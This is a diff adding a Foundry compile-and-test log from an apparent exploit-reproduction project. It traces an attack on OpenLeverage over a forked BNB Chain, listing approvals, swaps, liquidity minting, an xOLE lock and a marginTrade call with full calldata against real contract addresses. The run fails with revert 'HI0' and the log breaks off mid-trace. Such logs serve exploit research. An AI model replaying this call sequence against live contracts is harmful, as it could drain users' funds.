@@ -1,0 +1,714 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.55s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2024-04/OpenLeverage2_exp.sol:99:5:
+   |
+99 |     IERC20 private constant USDC =
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:2629:1:
+     |
+2629 | interface USDC {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/2024-04/OpenLeverage2_exp.sol:105:5:
+    |
+105 |     IERC20 private constant WBNB =
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:2080:1:
+     |
+2080 | interface WBNB {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/2024-04/OpenLeverage2_exp.sol:311:5:
+    |
+311 |     IERC20 private constant WBNB =
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:2080:1:
+     |
+2080 | interface WBNB {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2072): Unused local variable.
+   --> src/test/2024-04/OpenLeverage2_exp.sol:166:13:
+    |
+166 |             uint16 feesRate,
+    |             ^^^^^^^^^^^^^^^
+
+Warning (2072): Unused local variable.
+   --> src/test/2024-04/OpenLeverage2_exp.sol:167:13:
+    |
+167 |             uint16 priceDiffientRatio,
+    |             ^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Warning (2072): Unused local variable.
+   --> src/test/2024-04/OpenLeverage2_exp.sol:178:13:
+    |
+178 |             uint256 availableBorrow = LToken.availableForBorrow();
+    |             ^^^^^^^^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 369.98ms (124.18µs CPU time)
+
+Ran 1 test for src/test/2024-04/OpenLeverage2_exp.sol:ContractTest
+[FAIL. Reason: revert: HI0] testExploit() (gas: 2135212)
+Logs:
+  Exploiter BNB balance before attack: 5.000000000000000000
+
+Traces:
+  [7986] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 37470328 [3.747e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(ETH: [0x2170Ed0880ac9A755fd29B2688956BD959F933F8], "ETH")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], "USDC")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(BTCB: [0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c], "BTCB")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(BUSDT: [0x55d398326f99059fF775485246999027B3197955], "BUSDT")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(OLE: [0xB7E2713CF55cf4b469B5a8421Ae6Fc0ED18F1467], "OLE")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(xOLE: [0x71F1158D76aF5B6762D5EbCdEE19105eab2C77d2], "xOLE")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], "USDC_OLE")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Router")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], "TradeController")
+    │   └─ ← [Return] 
+    ├─ [0] VM::label(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], "OPBorrowingDelegator")
+    │   └─ ← [Return] 
+    └─ ← [Stop] 
+
+  [2135212] ContractTest::testExploit()
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000000000000000 [5e18])
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Exploiter BNB balance before attack", val: 5000000000000000000 [5e18], decimals: 18)
+    ├─ [31808] USDC::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [24562] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [24562] BUSDT::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [128183] Router::swapETHForExactTokens{value: 10000000000000000}(100, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1711948730 [1.711e9])
+    │   ├─ [2893] 0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b::getReserves() [staticcall]
+    │   │   └─ ← [Return] 506915345474394666274986 [5.069e23], 852374363297085738373 [8.523e20], 1711948655 [1.711e9]
+    │   ├─ [23974] WBNB::deposit{value: 1}()
+    │   │   ├─ emit Deposit(dst: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1)
+    │   │   └─ ← [Stop] 
+    │   ├─ [8062] WBNB::transfer(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b, 1)
+    │   │   ├─ emit Transfer(from: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: 0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b, value: 1)
+    │   │   └─ ← [Return] true
+    │   ├─ [65881] 0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b::swap(100, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [30739] USDC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100)
+    │   │   │   ├─ [29993] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1296] USDC::balanceOf(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b) [staticcall]
+    │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b) [delegatecall]
+    │   │   │   │   └─ ← [Return] 506915345474394666274886 [5.069e23]
+    │   │   │   └─ ← [Return] 506915345474394666274886 [5.069e23]
+    │   │   ├─ [534] WBNB::balanceOf(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b) [staticcall]
+    │   │   │   └─ ← [Return] 852374363297085738374 [8.523e20]
+    │   │   ├─ emit Sync(reserve0: 506915345474394666274886 [5.069e23], reserve1: 852374363297085738374 [8.523e20])
+    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1, amount0Out: 100, amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   ├─ [55] ContractTest::receive{value: 9999999999999999}()
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] [1, 100]
+    ├─ [92997] Router::swapTokensForExactTokens(100, 100, [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, 0xB7E2713CF55cf4b469B5a8421Ae6Fc0ED18F1467], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1711948730 [1.711e9])
+    │   ├─ [2893] USDC_OLE::getReserves() [staticcall]
+    │   │   └─ ← [Return] 653913026999991532179721 [6.539e23], 7473857951892495862889509 [7.473e24], 1711947914 [1.711e9]
+    │   ├─ [11586] USDC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], 9)
+    │   │   ├─ [10834] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], 9) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], value: 9)
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639926 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [67621] USDC_OLE::swap(0, 100, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [29849] OLE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100)
+    │   │   │   ├─ emit Transfer(from: USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1296] USDC::balanceOf(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4]) [staticcall]
+    │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 653913026999991532179730 [6.539e23]
+    │   │   │   └─ ← [Return] 653913026999991532179730 [6.539e23]
+    │   │   ├─ [664] OLE::balanceOf(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4]) [staticcall]
+    │   │   │   └─ ← [Return] 7473857951892495862889409 [7.473e24]
+    │   │   ├─ emit Sync(reserve0: 653913026999991532179730 [6.539e23], reserve1: 7473857951892495862889409 [7.473e24])
+    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 9, amount1In: 0, amount0Out: 0, amount1Out: 100, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] [9, 100]
+    ├─ [664] OLE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 100
+    ├─ [3149] OLE::transfer(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], 100)
+    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], value: 100)
+    │   └─ ← [Return] true
+    ├─ [1296] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 91
+    │   └─ ← [Return] 91
+    ├─ [4039] USDC::transfer(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], 91)
+    │   ├─ [3293] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], 91) [delegatecall]
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4], value: 91)
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [82937] USDC_OLE::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [1296] USDC::balanceOf(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4]) [staticcall]
+    │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4]) [delegatecall]
+    │   │   │   └─ ← [Return] 653913026999991532179821 [6.539e23]
+    │   │   └─ ← [Return] 653913026999991532179821 [6.539e23]
+    │   ├─ [664] OLE::balanceOf(USDC_OLE: [0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4]) [staticcall]
+    │   │   └─ ← [Return] 7473857951892495862889509 [7.473e24]
+    │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
+    │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 78701485585576397102 [7.87e19])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 28)
+    │   ├─ emit Sync(reserve0: 653913026999991532179821 [6.539e23], reserve1: 7473857951892495862889509 [7.473e24])
+    │   ├─ emit Mint(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 91, amount1: 100)
+    │   └─ ← [Return] 28
+    ├─ [537] USDC_OLE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 28
+    ├─ [24598] USDC_OLE::approve(xOLE: [0x71F1158D76aF5B6762D5EbCdEE19105eab2C77d2], 28)
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: xOLE: [0x71F1158D76aF5B6762D5EbCdEE19105eab2C77d2], value: 28)
+    │   └─ ← [Return] true
+    ├─ [251100] xOLE::create_lock(1, 1713763130 [1.713e9])
+    │   ├─ [245931] 0x10551D76f20f0Ee53f3812B4092D5E00550aadA7::create_lock(1, 1713763130 [1.713e9]) [delegatecall]
+    │   │   ├─ [9043] USDC_OLE::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], xOLE: [0x71F1158D76aF5B6762D5EbCdEE19105eab2C77d2], 1)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: xOLE: [0x71F1158D76aF5B6762D5EbCdEE19105eab2C77d2], value: 1)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
+    │   │   ├─ emit DelegateVotesChanged(delegate: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], previousBalance: 0, newBalance: 1)
+    │   │   ├─ emit Deposit(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 1, param2: 1713398400 [1.713e9], param3: 1, param4: 0, param5: 1)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [21062] TradeController::markets(24) [staticcall]
+    │   ├─ [15735] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::markets(24) [delegatecall]
+    │   │   └─ ← [Return] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617, 0xa75323e651e0EAC7756003F7E0c3Fc8967FB1925, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 450, 0, 5, 0x74e4Fb918480D57718Ad1e46113F70a110ff7Fbe, 57549311202102038545 [5.754e19], 10564809865456566322330 [1.056e22]
+    │   └─ ← [Return] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617, 0xa75323e651e0EAC7756003F7E0c3Fc8967FB1925, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 450, 0, 5, 0x74e4Fb918480D57718Ad1e46113F70a110ff7Fbe, 57549311202102038545 [5.754e19], 10564809865456566322330 [1.056e22]
+    ├─ [10568] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617::getCash() [staticcall]
+    │   ├─ [5331] 0xe307E9C4aa77E69FF084E4FFCd7de93F497D68b6::getCash() [delegatecall]
+    │   │   ├─ [2534] WBNB::balanceOf(0x7c5e04894410e98b1788fbdB181FfACbf8e60617) [staticcall]
+    │   │   │   └─ ← [Return] 154004391875378873411 [1.54e20]
+    │   │   └─ ← [Return] 154004391875378873411 [1.54e20]
+    │   └─ ← [Return] 154004391875378873411 [1.54e20]
+    ├─ [36317] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617::accrueInterest()
+    │   ├─ [35660] 0xe307E9C4aa77E69FF084E4FFCd7de93F497D68b6::accrueInterest() [delegatecall]
+    │   │   ├─ [534] WBNB::balanceOf(0x7c5e04894410e98b1788fbdB181FfACbf8e60617) [staticcall]
+    │   │   │   └─ ← [Return] 154004391875378873411 [1.54e20]
+    │   │   ├─ emit AccrueInterest(cashPrior: 154004391875378873411 [1.54e20], interestAccumulated: 2937058279461398 [2.937e15], borrowIndex: 14070628693316506993971453 [1.407e25], totalBorrows: 41520146736955272543 [4.152e19])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [5773] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617::availableForBorrow() [staticcall]
+    │   ├─ [5037] 0xe307E9C4aa77E69FF084E4FFCd7de93F497D68b6::availableForBorrow() [delegatecall]
+    │   │   ├─ [534] WBNB::balanceOf(0x7c5e04894410e98b1788fbdB181FfACbf8e60617) [staticcall]
+    │   │   │   └─ ← [Return] 154004391875378873411 [1.54e20]
+    │   │   └─ ← [Return] 114585136635201676636 [1.145e20]
+    │   └─ ← [Return] 114585136635201676636 [1.145e20]
+    ├─ [13575] Router::getAmountsOut(4999999999999999999 [4.999e18], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   ├─ [2893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   └─ ← [Return] 5000411537957262268624753 [5e24], 8417268602266725953717 [8.417e21], 1711948730 [1.711e9]
+    │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   └─ ← [Return] 5000411537957262268624753 [5e24], 8417268602266725953717 [8.417e21], 1711948730 [1.711e9]
+    │   └─ ← [Return] [4999999999999999999 [4.999e18], 2961148680678296281262 [2.961e21], 4969149851529661818 [4.969e18]]
+    ├─ [82608] Router::swapExactETHForTokens{value: 4999999999999999999}(0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1711948730 [1.711e9])
+    │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   └─ ← [Return] 5000411537957262268624753 [5e24], 8417268602266725953717 [8.417e21], 1711948730 [1.711e9]
+    │   ├─ [21974] WBNB::deposit{value: 4999999999999999999}()
+    │   │   ├─ emit Deposit(dst: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 4999999999999999999 [4.999e18])
+    │   │   └─ ← [Stop] 
+    │   ├─ [8062] WBNB::transfer(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 4999999999999999999 [4.999e18])
+    │   │   ├─ emit Transfer(from: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 4999999999999999999 [4.999e18])
+    │   │   └─ ← [Return] true
+    │   ├─ [36764] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(2961148680678296281262 [2.961e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [12871] BUSDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2961148680678296281262 [2.961e21])
+    │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2961148680678296281262 [2.961e21])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   └─ ← [Return] 4997450389276583972343491 [4.997e24]
+    │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   └─ ← [Return] 8422268602266725953716 [8.422e21]
+    │   │   ├─ emit Sync(reserve0: 4997450389276583972343491 [4.997e24], reserve1: 8422268602266725953716 [8.422e21])
+    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 4999999999999999999 [4.999e18], amount0Out: 2961148680678296281262 [2.961e21], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] [4999999999999999999 [4.999e18], 2961148680678296281262 [2.961e21]]
+    ├─ [24562] BUSDT::approve(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 2961148680678296281262 [2.961e21])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], value: 2961148680678296281262 [2.961e21])
+    │   └─ ← [Return] true
+    ├─ [289957] → new Executor@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 1448 bytes of code
+    ├─ [609011] TradeController::marginTrade(24, true, true, 2961148680678296281262 [2.961e21], 33127665676864412120 [3.312e19], 0, 0x150000000212aa3caf0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000006a75ac4b8d8e76d15502e69be4cb6325422833b4000000000000000000000000000000000000000000000001cbbd1c6a4b6759d80000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000000000000000010018000000000000000000000000f436f8fe7b26d87eb74e5446acec2e8ad4075e47)
+    │   ├─ [608124] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::marginTrade(24, true, true, 2961148680678296281262 [2.961e21], 33127665676864412120 [3.312e19], 0, 0x150000000212aa3caf0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000006a75ac4b8d8e76d15502e69be4cb6325422833b4000000000000000000000000000000000000000000000001cbbd1c6a4b6759d80000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000000000000000010018000000000000000000000000f436f8fe7b26d87eb74e5446acec2e8ad4075e47) [delegatecall]
+    │   │   ├─ [2534] WBNB::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   └─ ← [Return] 161417993195347131951 [1.614e20]
+    │   │   ├─ [2531] BUSDT::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   └─ ← [Return] 59000425570140817624127 [5.9e22]
